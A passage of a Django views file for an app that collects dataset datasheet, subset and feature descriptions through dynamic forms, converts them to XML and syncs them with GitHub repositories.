import requests
from django.conf import settings

from django.http import JsonResponse
import json

from django.shortcuts import render
from django.http import HttpResponse, HttpResponseRedirect

from .forms import CreateNewList, PurposeForm, MyForm, AboutForm

from .forms import DocumentForm


from .purpose_converter import PurposeConverter
from .sf_converter import SFConverter

from .kw_converter import KWConverter


from datetime import datetime

from github import GithubException, UnknownObjectException
import base64
from github import Github

import xml.etree.cElementTree as ET
from github import GithubException
import base64

from django import forms

import pathlib




# Create your views here.
def index(request):
    #return HttpResponse('Hello from Python!')
    user = request.user
    if not user.is_authenticated:
        print("Yes")
    r = requests.get('http://httpbin.org/status/418')
    print(r.text)
    return render(request, "memeber_area.html", {"name" : user.get_username()})

def memeber_area(request):
    user = request.user
    
    if not user.is_authenticated:
        index(request)
    
    return render(request, "memeber_area.html", {"name" : user.get_username()})

def new_repo(request):
    user = request.user
    
    if not user.is_authenticated:
        index(request)
    
    return render(request, "new_repository.html", {"name" : user.get_username()})

def owned_repos(request, msg =""):
    user = request.user
    
    if not user.is_authenticated:
        index(request)

    g = Github(settings.GITHUN_TOKEN)

    repos = []
    user = g.get_user()
    april_2021 = datetime(2021, 4, 23)

    for repo in user.get_repos():
        if repo.created_at > april_2021:
            repos.append(repo.name)
    url = "https://{username}.github.io/".format(username=user.login)
    
    return render(request, "owned_repos.html", {"repo_list" : repos, "message" : msg, "url": url})


def edit_datasheet_repo(request, repo_name):
    user = request.user
    
    if not user.is_authenticated:
        index(request)
    if request.method == 'POST': 
        user = request.user 
        converter = PurposeConverter(user.get_username())

        # create a form instance and populate it with data from the request:
        form = PurposeForm(request.POST)
        # check whether it's valid:
        
        if form.is_valid():
            # process the data in form.cleaned_data as required
                       
            for key, value in form.cleaned_data.items():
                if not (("title_" in key) or ("desc_" in key)):
                    converter.form_xml(key, value)
            file_name = converter.save()
            print(".................::::::: SUCCESSFULLY converted to " + file_name)


            upload_to_github(file_name, repo_name)

            print(".................::::::::::::::::: DONE uploading to github :::::::::::::::....................")
             
            #repos = ['connect_heroku', 'mofi_connect', 'test repo1', 'Moshgan repo']

            return owned_repos(request, "Edited Successfully")

    # if a GET (or any other method) we'll create a blank form
    else:
        print("-------Start--------")
        print("fetch the form from github")
        datasheet_file_name = "questionnaire.xml"
        try:
            init_values = fetch_remote_datasheet(repo_name, datasheet_file_name)
        except:
            return new_datasheet_name(request, repo_name)
        form = PurposeForm(initial= init_values)
        print("-------Succeeded--------")

    return render(request, "new_datasheet.html",{ "form":form, "repo_name":repo_name})

def edit_subsetfeature_repo(request, repo_name):
    user = request.user
    if not user.is_authenticated:
        index(request)

    if request.method == 'POST': 
        print("------------------- the extra field count is " , request.POST.get('extra_field_count'))
        s_ex = request.POST.get('extra_field_count') or '0' # Tracking the number of subsets
        f_ex = request.POST.get('extra_ft_count') or '0' # Tracking the number of features
        
        subset_questions = ["Subset", 
                            "What is the ID of the Subset?",
                            "What is the Name of the Subset?",
                             "When was the subset last updated?",
                            "What is the modality of the subset? (The type of data)",
                            "What is the format or the schema of the subset?",
                            "What is the size of the subset? (Number of rows if it's a table or files if it's a directory)",
                            "What is the ID of the parent of the subset? (Use 0 if none)",
                            "What is the purpose of the subset?",
                            "What is the link (URL) to further description of the subset?",
                            "Have you calculated a covariance matrix (or similar) and made it available in this dataset? Where?",
                            "Have you modeled all (or a few) features and made the models accessible in this dataset? Where?" ]

        feature_questions = ["Feature", 
                            "What is the ID of the Feature?",
                            "What is the ID of the reference subset of the feature?",
                            "What is the introduction date of the feature?",
                            "What is the name of the feature?",
                            "What are the values that the feature might take?",
                            "What special meaning does NA, NULL, NONE, or any other placeholder have with respect to this feature?",
                            "What is the meaning of the feature if it is zero?",
                            "What does it mean if no value is to be found?",
                            "What level of non-zero sparsity is there?",
                            "What is the mean if the feature is nummeric?",
                            "What is the standard deviation if the feature is numeric?",
                            "How many modes does the feature have?",
                            "What is the median value?",
                            "What is the inter quartile range?",
                            "What is the ID of the parent feature (If derived from other features)",
                            "What unit is this feature in? ",
                            "Define the feature.",
                            "Why does the feature exist or is it superfluous?",
                            "State whether the feature is encoded and what the mapping is." ]

        fields = {    'extra_field_count' : forms.CharField(widget=forms.HiddenInput(), initial=s_ex),
                    'extra_ft_count' : forms.CharField(widget=forms.HiddenInput(), initial=f_ex),
                    }
        for key, value in request.POST.items():
            if "field" in key and ('extra' not in key):
                if "subset" in key:
                    _id_group = key.split("_")

                    _id = _id_group[2]
                    if _id == "title":
                        fields[key] = forms.CharField(required=False, label="Subset", \
                            widget=forms.TextInput(attrs={'style':'visibility:hidden; height:0px; padding:0px;'}), initial=value)
                    else:
                        fields[key] = forms.CharField(required=False,label = subset_questions[int(_id)], \
                            widget=forms.TextInput(attrs={'class': 'form-control', 'style':'max-width : 200px;'}), initial=value)
                
                if "feature" in key:
                    _id_group = key.split("_")

                    _id = _id_group[2]
                    if _id == "title":
                        fields[key] = forms.CharField(required=False, label="Feature", \
                            widget=forms.TextInput(attrs={'style':'visibility:hidden; height:0px; padding:0px;'}), initial=value)
                    else:
                        fields[key] = forms.CharField(required=False,label = feature_questions[int(_id)], \
                            widget=forms.TextInput(attrs={'class': 'form-control', 'style':'max-width : 200px;'}), initial=value)
                
        
        if "subset_submission" in request.POST: 
            fields['subset_{index}_title_field'.format(index=s_ex)] = \
                forms.CharField(required=False, label="Subset",  widget=forms.TextInput(attrs={'style':'visibility:hidden; height:0px; padding:0px;'}))
            for cnt in range(1, len(subset_questions)):
                fields['subset_{index}_{cnt}_field'.format(index=s_ex, cnt = cnt)] = forms.CharField(required=False,label = subset_questions[cnt], \
                widget=forms.TextInput(attrs={'class': 'form-control', 'style':'max-width : 200px;'}))
        
 
        if "feature_submission" in request.POST: 
            fields['feature_{index}_title_field'.format(index=f_ex)] = \
                forms.CharField(required=False, label="Feature",  widget=forms.TextInput(attrs={'style':'visibility:hidden; height:0px; padding:0px;'}))
            for cnt in range(1, len(feature_questions)):
                fields['feature_{index}_{cnt}_field'.format(index=f_ex, cnt = cnt)] = forms.CharField(required=False,label = feature_questions[cnt], \
                widget=forms.TextInput(attrs={'class': 'form-control', 'style':'max-width : 200px;'}))
        
        if "delete" in request.POST:
            #print("Delete button was pressed. but which one?")
            del_id = request.POST['delete']
            #print("this one ",delid)
            for cnt in range(1, len(feature_questions)):
                same_g = del_id.replace('title', str(cnt))
                #print("this is the id of the removed field ", same_g)
                fields.pop(same_g, None)
            fields.pop(del_id, None)
            print("worked. deleted")
        
        F_form = type('F_form', (forms.BaseForm,), { 'base_fields': fields })
        form = F_form() 
        if "data_submission" not in request.POST:
            print("------------------- bye for now ")
            return render(request, "new_subsetfeature.html", { 'form': form })

        
        if "data_submission" in request.POST:
            form = F_form(request.POST)
            print("form is fed with post req")

        if form.is_valid():
            print("Form is being submitted")
            user = request.user 
            converter = SFConverter(user.get_username())

            fDict = dict()
            sDict = dict()
            
            for key, value in form.cleaned_data.items():
                if "feature" in key:
                    fDict[key] = value
                if "subset" in key:
                    sDict[key] = value
            
            bag = []

            if not sDict:
                return render(request, "new_subsetfeature.html", { 'form': form , 'error_message': 'The form needs at least one subset.'})
            for key, value in sDict.items():
                print("sDict " + key)
                if ("title" in key) and (bag):
                    # call function for previous bag, checks in only if this title is not the first title. otherwise bag is empty
                    list_ans = {"ID":bag[0],
                                "Name": bag[1],
                                "LastUpdate":bag[2],
                                "Modality":bag[3],
                                "Format":bag[4],
                                "Size":bag[5],
                                "ParentID":bag[6],
                                "Purpose":bag[7],
                                "Link":bag[8],
                                "Covmat":bag[9],
                                "Modsys":bag[10]}
                    try:
                        converter.subset_to_xml(list_ans)
                    except Exception as e:
                        return render(request, "new_subsetfeature.html", { 'form': form , 'error_message': e})
                    bag = []
                elif "title" not in key:
                    bag.append(value)

            
            try:
                list_ans = {"ID":bag[0],
                        "Name": bag[1],
                        "LastUpdate":bag[2],
                        "Modality":bag[3],
                        "Format":bag[4],
                        "Size":bag[5],
                        "ParentID":bag[6],
                        "Purpose":bag[7],
                        "Link":bag[8],
                        "Covmat":bag[9],
                        "Modsys":bag[10]}
                converter.subset_to_xml(list_ans)
            except Exception as e:
                return render(request, "new_subsetfeature.html", { 'form': form , 'error_message': e})
                    
            if fDict:
                print("There are Features")
                bag = []
                for key, value in fDict.items():
                    print("fDict " + key)
                    if ("title" in key) and (bag):
                        # call function for previous bag, checks in only if this title is not the first title. otherwise bag is empty

                        list_ans = {'ID': bag[0],
                                    'Subset': bag[1],
                                    'Introduction': bag[2],
                                    'Name': bag[3],
                                    'Values': bag[4],
                                    'Meaning_NA_NULL_NONE_OTHER': bag[5],
                                    'Meaning_Zero': bag[6],
                                    'Meaning_BlankVoid': bag[7],
                                    'Sparsity': bag[8],
                                    'Mean': bag[9],
                                    'Std': bag[10],
                                    'Modality': bag[11],
                                    'Median': bag[12],
                                    'IQR': bag[13],
                                    'ParentIDs': bag[14],
                                    'Unit': bag[15],
                                    'Definition': bag[16],
                                    'Purpose': bag[17],
                                    'Encoding': bag[18]}

                        try:
                            converter.feature_to_xml(list_ans)
                            
                        except Exception as e:
                            print("exception occured", str(e))
                            return render(request, "new_subsetfeature.html", { 'form': form , 'error_message': e})

                        bag = []
                    elif "title" not in key:
                        bag.append(value)
                
                try:
                    list_ans = {'ID': bag[0],
                            'Subset': bag[1],
                            'Introduction': bag[2],
                            'Name': bag[3],
                            'Values': bag[4],
                            'Meaning_NA_NULL_NONE_OTHER': bag[5],
                            'Meaning_Zero': bag[6],
                            'Meaning_BlankVoid': bag[7],
                            'Sparsity': bag[8],
                            'Mean': bag[9],
                            'Std': bag[10],
                            'Modality': bag[11],
                            'Median': bag[12],
                            'IQR': bag[13],
                            'ParentIDs': bag[14],
                            'Unit': bag[15],
                            'Definition': bag[16],
                            'Purpose': bag[17],
                            'Encoding': bag[18]}
                    converter.feature_to_xml(list_ans)
                except Exception as e:
                    print("exception occured", str(e))
                    return render(request, "new_subsetfeature.html", { 'form': form, 'error_message': e})

            file_name = converter.save()
            print(".................::::::: SUCCESSFULLY converted to " + file_name)

            upload_to_github(file_name, repo_name)
            
            return owned_repos(request, "Edited Successfully")

    # if a GET (or any other method) we'll create a blank form
    else:
        print("-------Start getting features from github--------")
        print("fetch the form from github")
        #file_name = "subset_feature_" + user.get_username() +".xml"
        file_name = "feature_description.xml"
        try:
            init_values = fetch_remote_feature(repo_name, file_name)
        except:
            return new_feature(request, repo_name)
        #form = PurposeForm(initial= init_values)
        print("-------Succeeded--------")


        #print("------------------- the extra field count is " , request.POST.get('extra_field_count'))
        # the initialization of subset extra and feature extra should be consistent with the current number of subsets and features. We don't want a duplicated of subset_1_?_field

        _keys = list(init_values.keys())
        _titles = [k for k in _keys if 'title' in k]

        _no_subsets = len([k for k in _titles if 'subset' in k])
        _no_features = len([k for k in _titles if 'feature' in k])


        print("number of subsets ", _no_subsets)

        print("number of features ", _no_features)


        s_ex = str(_no_subsets) # Tracking the number of subsets
        f_ex = str(_no_features) # Tracking the number of features

        
        subset_questions = ["Subset", 
                            "What is the ID of the Subset?",
                            "What is the Name of the Subset?",
                            "When was the subset last updated?",
                            "What is the modality of the subset? (The type of data)",
                            "What is the format or the schema of the subset?",
                            "What is the size of the subset? (Number of rows if it's a table or files if it's a directory)",
                            "What is the ID of the parent of the subset? (Use 0 if none)",
                            "What is the purpose of the subset?",
                            "What is the link (URL) to further description of the subset?",
                            "Have you calculated a covariance matrix (or similar) and made it available in this dataset? Where?",
                            "Have you modeled all (or a few) features and made the models accessible in this dataset? Where?" ]

        feature_questions = ["Feature", 
                            "What is the ID of the Feature?",
                            "What is the ID of the reference subset of the feature?",
                            "What is the introduction date of the feature?",
                            "What is the name of the feature?",
                            "What are the values that the feature might take?",
                            "What special meaning does NA, NULL, NONE, or any other placeholder have with respect to this feature?",
                            "What is the meaning of the feature if it is zero?",
                            "What does it mean if no value is to be found?",
                            "What level of non-zero sparsity is there?",
                            "What is the mean if the feature is nummeric?",
                            "What is the standard deviation if the feature is numeric?",
                            "How many modes does the feature have?",
                            "What is the median value?",
                            "What is the inter quartile range?",
                            "What is the ID of the parent feature (If derived from other features)",
                            "What unit is this feature in? ",
                            "Define the feature.",
                            "Why does the feature exist or is it superfluous?",
                            "State whether the feature is encoded and what the mapping is." ]

        fields = {    'extra_field_count' : forms.CharField(widget=forms.HiddenInput(), initial=s_ex),
                    'extra_ft_count' : forms.CharField(widget=forms.HiddenInput(), initial=f_ex),
                    }
        print("----------- the map of the xml values")

        for key, value in init_values.items():
            if "field" in key and ('extra' not in key):
            #    fields[key] = forms.CharField(required=False,label = "What is the ID of the Subset static ?", \
            #    widget=forms.TextInput(attrs={'class': 'form-control', 'style':'max-width : 200px;'}), initial=value)
                if "subset" in key:
                    _id_group = key.split("_")

                    _id = _id_group[2]
                    if _id == "title":
                        fields[key] = forms.CharField(required=False, label="Subset", \
                            widget=forms.TextInput(attrs={'style':'visibility:hidden; height:0px; padding:0px;'}), initial=value)
                    else:
                        fields[key] = forms.CharField(required=False,label = subset_questions[int(_id)], \
                            widget=forms.TextInput(attrs={'class': 'form-control', 'style':'max-width : 200px;'}), initial=value)
                
                if "feature" in key:
                    _id_group = key.split("_")

                    _id = _id_group[2]
                    if _id == "title":
                        fields[key] = forms.CharField(required=False, label="Feature", \
                            widget=forms.TextInput(attrs={'style':'visibility:hidden; height:0px; padding:0px;'}), initial=value)
                    else:
                        fields[key] = forms.CharField(required=False,label = feature_questions[int(_id)], \
                            widget=forms.TextInput(attrs={'class': 'form-control', 'style':'max-width : 200px;'}), initial=value)
        F_form = type('F_form', (forms.BaseForm,), { 'base_fields': fields })
        form = F_form()
        
        print("-------Successful conversion to dynamic form----------- ")
    return render(request, "new_subsetfeature.html", { 'form': form })



def get_blob_content(repo, branch, path_name):
    # first get the branch reference
    ref = repo.get_git_ref(f'heads/{branch}')
    # then get the tree
    tree = repo.get_git_tree(ref.object.sha, recursive='/' in path_name).tree
    # look for path in tree
    sha = [x.sha for x in tree if x.path == path_name]
    if not sha:
        # well, not found..
        return None
    # we have sha
    return repo.get_git_blob(sha[0])

def fetch_remote_keyword(repo_name, file_name):
    g = Github(settings.GITHUN_TOKEN)

    repo = g.get_repo("sinaden/"+repo_name)

    xml_string = ""
    
    try:
        xml_string = repo.get_contents("xml/target/" + file_name)
        # ok, we have the content
    except GithubException as e:
        #print("We are here")
        print(e)
        blob = get_blob_content(repo, "main", "xml/target/" + file_name)
        b64 = base64.b64decode(blob.content)
        xml_string = b64.decode("utf8")
        
    #print(xml_string)

    ghxml = ET.fromstring(xml_string.decoded_content)

    q = ghxml.find('Keywords_Dataset')

    init_map= {}
    keyword_map = { 'Keyword':1, 
        'Definition':2, 
        'Link':3}

    s_cnt = 0
    for keyword in q:
        print(keyword.tag.lower())
        s_cnt += 1
        cnt = 1
        title_field = 'keyword_' + str(s_cnt) +'_title_field'
        init_map[title_field] = 'Keyword'
        
        for ans in keyword:
            field_name = 'keyword_' + str(s_cnt) +'_' + str(keyword_map[ans.tag]) + '_field'
            print(field_name)
            init_map[field_name] = ans.text

    return init_map

def fetch_remote_feature(repo_name, file_name):
    g = Github(settings.GITHUN_TOKEN)

    repo = g.get_repo("sinaden/"+repo_name)

    xml_string = ""
    
    try:
        xml_string = repo.get_contents("xml/target/" + file_name)
        # ok, we have the content
    except GithubException as e:
        #print("We are here")
        print(e)
        blob = get_blob_content(repo, "main", "xml/target/" + file_name)
        b64 = base64.b64decode(blob.content)
        xml_string = b64.decode("utf8")
        
    #print(xml_string)

    ghxml = ET.fromstring(xml_string.decoded_content)

    q = ghxml.find('Subset_Feature_Dataset')

    init_map= {}
    subset_map = { 'ID':1, 
        'Name':2, 
        'LastUpdate':3, 
        'Modality':4, 
        'Format':5, 
        'Size':6, 
        'ParentID':7, 
        'Purpose':8, 
        'Link':9, 
        'Covmat':10, 
        'Modsys':11, 
        'Features':12,}

    feature_map = { 'ID':1,
                    'Subset':2,
                    'Introduction':3,
                    'Name':4,
                    'Values':5,
                    'Meaning_NA_NULL_NONE_OTHER':6,
                    'Meaning_Zero':7,
                    'Meaning_BlankVoid':8,
                    'Sparsity':9,
                    'Mean':10,
                    'Std':11,
                    'Modality':12,
                    'Median':13,
                    'IQR':14,
                    'ParentIDs':15,
                    'Unit':16,
                    'Definition':17,
                    'Purpose':18,
                    'Encoding':19}
    s_cnt = 0
    f_cnt = 0
    for subset in q:
        print(subset.tag.lower())
        s_cnt += 1
        cnt = 1
        title_field = 'subset_' + str(s_cnt) +'_title_field'
        init_map[title_field] = 'Subset'
        
        for ans in subset:
            if ans.tag != 'Features':
                field_name = 'subset_' + str(s_cnt) +'_' + str(subset_map[ans.tag]) + '_field'
                print(field_name)
                init_map[field_name] = ans.text
                
            
            if ans.tag == 'Features':
                for feature in ans:
                    f_cnt += 1
                    title_field = 'feature_' + str(f_cnt) +'_title_field'
                    init_map[title_field] = 'Feature'

                    print(title_field)
                    for f_ans in feature:
                        field_name = 'feature_'+str(f_cnt) + '_'+str(feature_map[f_ans.tag]) + '_field'
                        print(field_name)
                        init_map[field_name] = f_ans.text

    return init_map
                        

def fetch_remote_about(repo_name, file_name):
    g = Github(settings.GITHUN_TOKEN)

    repo = g.get_repo("sinaden/"+repo_name)

    xml_string = ""
    
    try:
        xml_string = repo.get_contents("xml/target/" + file_name)
        # ok, we have the content
    except GithubException:
        #print("We are here")
        blob = get_blob_content(repo, "main", "xml/target/" +file_name)
        b64 = base64.b64decode(blob.content)
        xml_string = b64.decode("utf8")
        
    #print(xml_string)

    ghxml = ET.fromstring(xml_string.decoded_content)
    #q = ghxml.find('questionnaire')
    fields = {}


    title_ans = ghxml.find('title').find('answer')
    fields['title'] = title_ans.text


    au = ghxml.find('authors')


    au_ans = au.find('answer')

    la = list(au_ans)

    

    a_str = ""

    if la:
        for ax in la:
            a_str += str(ax.find("firstnames").text or "")
            a_str += " "
            a_str += str(ax.find("lastname").text or "")
            a_str += ", "

        # remove the last comma and the rest of it
        a_str = a_str.rsplit(',', 1)[0]
    
    fields['authors'] = a_str
    
    

    abans = ghxml.find('abstract').find('answer')
    fields['abstract'] = abans.text or ""
    
    re_main = ghxml.find('research').find('main').find('answer')
    fields['research_main'] = re_main.text or ""

    re_sec = ghxml.find('research').find('secondary').find('answer')
    fields['research_secondary']= re_sec.text or ""


    return fields


def fetch_remote_datasheet(repo_name, file_name):
    g = Github(settings.GITHUN_TOKEN)

    repo = g.get_repo("sinaden/"+repo_name)

    xml_string = ""
    
    try:
        xml_string = repo.get_contents("xml/target/" + file_name)
        # ok, we have the content
    except GithubException:
        #print("We are here")
        blob = get_blob_content(repo, "main", "xml/target/" +file_name)
        b64 = base64.b64decode(blob.content)
        xml_string = b64.decode("utf8")
        
    #print(xml_string)

    ghxml = ET.fromstring(xml_string.decoded_content)
    q = ghxml.find('questionnaire')

    print("fetched the datasheet xml from github")

    cmap = {'category_1': 'motivation',
            'category_2': 'composition',
            'category_3': 'collectionprocess',
            'category_4': 'pcl',
            'category_5': 'uses',
            'category_6': 'distribution',
            'category_7': 'maintenance'}

    init_map = {}
    for cat in q:
    #print(cat.tag)
        an = cat.find('answers')
        for ans in an:
            _ano = ans.tag.replace('A','')
            ano = int(_ano) + 1
            form_label = cmap[cat.tag] + "_" + str(ano)
            if ans.text != None:
                print(form_label, ans.text)
                init_map[form_label] = ans.text
    print("converted xml into initialization dictionary")

    return init_map

def check_name_availability(request):
    '''Gets the name of the new repository from member_area.html and creates a new repository on github account.
    If the name was not unique otherwise ask for a new one '''

    #breakpoint()
    if request.method == 'POST':
        name = request.POST.get('repo_name')
        
        g = Github(settings.GITHUN_TOKEN)
        try:
            repo = g.get_repo("sinaden/"+name)
            if not repo:
                print(repo)
                print("was not outside")
                print("was not outside") 
                return JsonResponse({'message':'Name was unique'})
            else:
                print(repo)
                return JsonResponse({'message':'Repo already exists'})
        except Exception as e:
            print(e)
        #    user = g.get_user()
        #    new_repo = user.create_repo(name, description = "Created on heroku")
        #    new_repo.create_file("README.md", "first commit", "Repo was created on heroku")

            
            return JsonResponse({'message':'Name was unique, repo not created so that javascript can create it instead'})

        
    return JsonResponse({'message':'request was not valid'})

def check_repo_launch_ability(request):
    '''Gets the name of the new repository from member_area.html and checks if the repo contains all the files required to run the script for displaying blog representation, if so, it will call the script '''

    #breakpoint()
    if request.method == 'POST':

        repo_name = request.POST.get('repo_name')
        g = Github(settings.GITHUN_TOKEN)

        user = g.get_user()
        url = "https://{username}.github.io/{reponame}".format(username=user.login, reponame = repo_name)
        
        repo = g.get_repo("sinaden/"+repo_name)
        miss = []

        ls = {"about.xml": "Context form", "feature_description.xml": "Statistics","keyword_definitions.xml" : "Keywords","questionnaire.xml" : "Purpose ", "version_provenance.xml":""}
        for xml_file, value  in ls.items():
            try:
                contents = repo.get_contents("xml/target/" + xml_file)
                if contents:
                    print(xml_file, "Found")
            except UnknownObjectException as e:
                print(xml_file, e.data['message'])
                if xml_file == "version_provenance.xml":
                    download_from_github("xml/example/version_provenance.xml", repo_name)
                    #upload_to_github("version_provenance.xml", repo_name)
                elif xml_file == "about.xml":
                    download_from_github("xml/empty/about.xml", repo_name)
                else:
                    miss.append(value)


        jsonArray = json.dumps(miss)
        if miss:
            return JsonResponse({'message':'missing_items', 'missing_items': jsonArray})
        if not miss:
            try:
                ymlfile = repo.get_contents(".github/workflows/Github-Pages.yml")
            except Exception as e:
                # yml file which runs the github actions is not present in the repo, so we will upload it;
                upload_yaml_to_github(repo_name,".github/workflows/Github-Pages.yml")
                print(e)
            
            return JsonResponse({'message':'launch_ready', 'url': url})

    else:
        return JsonResponse({'message':'request was not valid'})


def new_repo_name(request, repo_name):
    '''
    Should change the name of this method later to "new repository" and remove the other "new_repository" method.
    '''
     # if this is a POST request we need to process the form data
    user = request.user
    
    if not user.is_authenticated:
        index(request)
    
    return render(request, "new_repository.html", {"name" : user.get_username(), "repo_name": repo_name})

def new_feature(request, repo_name):
    '''
    code copied from stackoverflow https://stackoverflow.com/questions/6142025/dynamically-add-field-to-a-form
    ''' 
    print("-------------------- welcome to the new function")
    
    if request.method == 'POST':
        
        print("------------------- the extra field count is " , request.POST.get('extra_field_count'))
        s_ex = request.POST.get('extra_field_count') or '0' # Tracking the number of subsets
        f_ex = request.POST.get('extra_ft_count') or '0' # Tracking the number of features
        
        subset_questions = ["Subset", 
                            "What is the ID of the Subset?",
                            "What is the Name of the Subset?",
                             "When was the subset last updated?",
                            "What is the modality of the subset? (The type of data)",
                            "What is the format or the schema of the subset?",
                            "What is the size of the subset? (Number of rows if it's a table or files if it's a directory)",
                            "What is the ID of the parent of the subset? (Use 0 if none)",
                            "What is the purpose of the subset?",
                            "What is the link (URL) to further description of the subset?",
                            "Have you calculated a covariance matrix (or similar) and made it available in this dataset? Where?",
                            "Have you modeled all (or a few) features and made the models accessible in this dataset? Where?" ]

        feature_questions = ["Feature", 
                            "What is the ID of the Feature?",
                            "What is the ID of the reference subset of the feature?",
                            "What is the introduction date of the feature?",
                            "What is the name of the feature?",
                            "What are the values that the feature might take?",
                            "What special meaning does NA, NULL, NONE, or any other placeholder have with respect to this feature?",
                            "What is the meaning of the feature if it is zero?",
                            "What does it mean if no value is to be found?",
                            "What level of non-zero sparsity is there?",
                            "What is the mean if the feature is nummeric?",
                            "What is the standard deviation if the feature is numeric?",
                            "How many modes does the feature have?",
                            "What is the median value?",
                            "What is the inter quartile range?",
                            "What is the ID of the parent feature (If derived from other features)",
                            "What unit is this feature in? ",
                            "Define the feature.",
                            "Why does the feature exist or is it superfluous?",
                            "State whether the feature is encoded and what the mapping is." ]

        fields = {    'extra_field_count' : forms.CharField(widget=forms.HiddenInput(), initial=s_ex),
                    'extra_ft_count' : forms.CharField(widget=forms.HiddenInput(), initial=f_ex),
                    }
        for key, value in request.POST.items():
            if "field" in key and ('extra' not in key):
                if "subset" in key:
                    _id_group = key.split("_")

                    _id = _id_group[2]
                    if _id == "title":
                        fields[key] = forms.CharField(required=False, label="Subset", \
                            widget=forms.TextInput(attrs={'style':'visibility:hidden; height:0px; padding:0px;'}), initial=value)
                    else:
                        fields[key] = forms.CharField(required=False,label = subset_questions[int(_id)], \
                            widget=forms.TextInput(attrs={'class': 'form-control', 'style':'max-width : 200px;'}), initial=value)
                
                if "feature" in key:
                    _id_group = key.split("_")

                    _id = _id_group[2]
                    if _id == "title":
                        fields[key] = forms.CharField(required=False, label="Feature", \
                            widget=forms.TextInput(attrs={'style':'visibility:hidden; height:0px; padding:0px;'}), initial=value)
                    else:
                        fields[key] = forms.CharField(required=False,label = feature_questions[int(_id)], \
                            widget=forms.TextInput(attrs={'class': 'form-control', 'style':'max-width : 200px;'}), initial=value)
                
        
        if "subset_submission" in request.POST: 
            fields['subset_{index}_title_field'.format(index=s_ex)] = \
                forms.CharField(required=False, label="Subset",  widget=forms.TextInput(attrs={'style':'visibility:hidden; height:0px; padding:0px;'}))
            for cnt in range(1, len(subset_questions)):
                fields['subset_{index}_{cnt}_field'.format(index=s_ex, cnt = cnt)] = forms.CharField(required=False,label = subset_questions[cnt], \
                widget=forms.TextInput(attrs={'class': 'form-control', 'style':'max-width : 200px;'}))
        
 
        if "feature_submission" in request.POST: 
            fields['feature_{index}_title_field'.format(index=f_ex)] = \
                forms.CharField(required=False, label="Feature",  widget=forms.TextInput(attrs={'style':'visibility:hidden; height:0px; padding:0px;'}))
            for cnt in range(1, len(feature_questions)):
                fields['feature_{index}_{cnt}_field'.format(index=f_ex, cnt = cnt)] = forms.CharField(required=False,label = feature_questions[cnt], \
                widget=forms.TextInput(attrs={'class': 'form-control', 'style':'max-width : 200px;'}))
        
        if "delete" in request.POST:
            #print("Delete button was pressed. but which one?")
            del_id = request.POST['delete']
            #print("this one ",delid)
            for cnt in range(1, len(feature_questions)):
                same_g = del_id.replace('title', str(cnt))
                #print("this is the id of the removed field ", same_g)
                fields.pop(same_g, None)
            fields.pop(del_id, None)
            print("worked. deleted")
        
        F_form = type('F_form', (forms.BaseForm,), { 'base_fields': fields })
        form = F_form() 
        if "data_submission" not in request.POST:
            print("------------------- bye for now ")
            return render(request, "new_subsetfeature.html", { 'form': form })

        print("you are here")
        
        if "data_submission" in request.POST:
            form = F_form(request.POST)
            print("form is fed with post req")

        if form.is_valid():
            print("Form is being submitted")
            user = request.user 
            converter = SFConverter(user.get_username())
            #print(form)
            fDict = dict()
            sDict = dict()
            


            for key, value in form.cleaned_data.items():
                if "feature" in key:
                    fDict[key] = value
                if "subset" in key:
                    sDict[key] = value

            print("--------Subset Dictionary--------------------------------")
            print(sDict)
            print("--------Subset Dictionary--------------------------------")
            bag = []

            if not sDict:
                return render(request, "new_subsetfeature.html", { 'form': form , 'error_message': 'The form needs at least one subset.'})
            for key, value in sDict.items():
                print("sDict " + key)
                if ("title" in key) and (bag):
                    # call function for previous bag, checks in only if this title is not the first title. otherwise bag is empty
                    list_ans = {"ID":bag[0],
                                "Name": bag[1],
                                "LastUpdate":bag[2],
                                "Modality":bag[3],
                                "Format":bag[4],
                                "Size":bag[5],
                                "ParentID":bag[6],
                                "Purpose":bag[7],
                                "Link":bag[8],
                                "Covmat":bag[9],
                                "Modsys":bag[10]}
                    try:
                        converter.subset_to_xml(list_ans)
                    except Exception as e:
                        return render(request, "new_subsetfeature.html", { 'form': form , 'error_message': e})
                    bag = []
                elif "title" not in key:
                    bag.append(value)

            
            try:
                list_ans = {"ID":bag[0],
                        "Name": bag[1],
                        "LastUpdate":bag[2],
                        "Modality":bag[3],
                        "Format":bag[4],
                        "Size":bag[5],
                        "ParentID":bag[6],
                        "Purpose":bag[7],
                        "Link":bag[8],
                        "Covmat":bag[9],
                        "Modsys":bag[10]}
                converter.subset_to_xml(list_ans)
            except Exception as e:
                return render(request, "new_subsetfeature.html", { 'form': form , 'error_message': e})
                    
            if fDict:
                print("There are Features")
                bag = []
                for key, value in fDict.items():
                    print("fDict " + key)
                    if ("title" in key) and (bag):
                        # call function for previous bag, checks in only if this title is not the first title. otherwise bag is empty

                        list_ans = {'ID': bag[0],
                                    'Subset': bag[1],
                                    'Introduction': bag[2],
                                    'Name': bag[3],
                                    'Values': bag[4],
                                    'Meaning_NA_NULL_NONE_OTHER': bag[5],
                                    'Meaning_Zero': bag[6],
                                    'Meaning_BlankVoid': bag[7],
                                    'Sparsity': bag[8],
                                    'Mean': bag[9],
                                    'Std': bag[10],
                                    'Modality': bag[11],
                                    'Median': bag[12],
                                    'IQR': bag[13],
                                    'ParentIDs': bag[14],
                                    'Unit': bag[15],
                                    'Definition': bag[16],
                                    'Purpose': bag[17],
                                    'Encoding': bag[18]}

                        try:
                            converter.feature_to_xml(list_ans)
                            
                        except Exception as e:
                            print("exception occured", str(e))
                            return render(request, "new_subsetfeature.html", { 'form': form , 'error_message': e})

                        bag = []
                    elif "title" not in key:
                        bag.append(value)
                
                try:
                    list_ans = {'ID': bag[0],
                            'Subset': bag[1],
                            'Introduction': bag[2],
                            'Name': bag[3],
                            'Values': bag[4],
                            'Meaning_NA_NULL_NONE_OTHER': bag[5],
                            'Meaning_Zero': bag[6],
                            'Meaning_BlankVoid': bag[7],
                            'Sparsity': bag[8],
                            'Mean': bag[9],
                            'Std': bag[10],
                            'Modality': bag[11],
                            'Median': bag[12],
                            'IQR': bag[13],
                            'ParentIDs': bag[14],
                            'Unit': bag[15],
                            'Definition': bag[16],
                            'Purpose': bag[17],
                            'Encoding': bag[18]}
                    converter.feature_to_xml(list_ans)
                except Exception as e:
                    print("exception occured", str(e))
                    return render(request, "new_subsetfeature.html", { 'form': form, 'error_message': e})


            file_name = converter.save()
            print(".................::::::: SUCCESSFULLY converted to " + file_name)

            upload_to_github(file_name, repo_name)
            
            print ("valid!")
            
            return new_repo_name(request, repo_name)

    else:
